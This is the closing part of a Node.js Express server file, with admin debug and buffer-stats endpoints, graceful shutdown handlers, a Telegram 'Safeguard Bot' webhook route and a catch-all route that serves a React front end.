      error: error.message
    });
  }
});

// Debug endpoint to show current device mappings and sessions
app.get('/api/debug/sessions', authenticateToken, requireAdmin, (req, res) => {
  try {
    const debugInfo = {
      deviceMappings: Array.from(deviceSessionMap.entries()),
      activeSessions: Array.from(activeSessions.entries()).map(([id, session]) => ({
        id,
        deviceHash: session.deviceHash,
        status: session.status,
        startTime: session.startTime
      })),
      timestamp: new Date().toISOString()
    };

    res.json(debugInfo);
  } catch (error) {
    res.status(500).json({
      error: error.message
    });
  }
});

// Buffer management endpoints
app.get('/api/buffer/stats', authenticateToken, requireAdmin, (req, res) => {
  try {
    const stats = bufferManager.getStats();
    res.json({
      success: true,
      stats,
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});



const PORT = process.env.PORT || 3000;

server.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📱 WebSocket endpoint: ws://localhost:${PORT}`);
  console.log(`🌐 HTTP endpoint: http://localhost:${PORT}`);
  console.log(`📊 Health check: http://localhost:${PORT}/health`);
  console.log(`💾 Database: SQLite at ${process.env.DATABASE_URL || 'prisma/dev.db'}`);

  // Start polling bot
  pollingBot.clearWebhook().then(() => {
    pollingBot.startPolling();
  });
});

// Graceful shutdown
process.on('SIGINT', async () => {
  console.log('\n💾 Saving sessions and closing database before shutdown...');
  try {
    // Stop polling bot
    pollingBot.stopPolling();
    console.log('✅ Polling bot stopped');

    // Abort all ongoing input operations
    for (const [sessionId, operation] of ongoingInputOperations.entries()) {
      operation.abortController.abort();
      console.log(`🚫 Aborted input operation for session: ${sessionId}`);
    }
    ongoingInputOperations.clear();
    console.log('🧹 Cleaned up all ongoing input operations');

    // Clear all debounce timers
    for (const [sessionId, timer] of inputDebounceTimers.entries()) {
      clearTimeout(timer);
      console.log(`🚫 Cleared debounce timer for session: ${sessionId}`);
    }
    inputDebounceTimers.clear();
    console.log('🧹 Cleaned up all debounce timers');


    await sessionDB.close();
    console.log('✅ Database closed successfully');
  } catch (error) {
    console.error('❌ Error during shutdown:', error);
  }
  process.exit(0);
});

process.on('SIGTERM', async () => {
  console.log('\n💾 Saving sessions and closing database before shutdown...');
  try {
    // Abort all ongoing input operations
    for (const [sessionId, operation] of ongoingInputOperations.entries()) {
      operation.abortController.abort();
      console.log(`🚫 Aborted input operation for session: ${sessionId}`);
    }
    ongoingInputOperations.clear();
    console.log('🧹 Cleaned up all ongoing input operations');

    // Clear all debounce timers
    for (const [sessionId, timer] of inputDebounceTimers.entries()) {
      clearTimeout(timer);
      console.log(`🚫 Cleared debounce timer for session: ${sessionId}`);
    }
    inputDebounceTimers.clear();
    console.log('🧹 Cleaned up all debounce timers');


    await sessionDB.close();
    console.log('✅ Database closed successfully');
  } catch (error) {
    console.error('❌ Error during shutdown:', error);
  }
  process.exit(0);
});

// ==================== TELEGRAM BOT WEBHOOK ====================

// Safeguard Bot webhook endpoint
app.post('/webhook/safeguard', async (req, res) => {
  try {
    console.log('📱 Received webhook update:', JSON.stringify(req.body, null, 2));
    await safeguardBot.handleUpdate(req.body);
    res.status(200).json({
      success: true
    });
  } catch (error) {
    console.error('❌ Error processing webhook:', error.message);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Catch-all handler: send back React's index.html file for any non-API routes
app.get('*', (req, res) => {
  // Skip API routes
  if (req.path.startsWith('/api/')) {
    return res.status(404).json({
      error: 'API endpoint not found'
    });
  }

  // For all other routes, serve the React app
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

module.exports = {
  app,
  server,
  io
};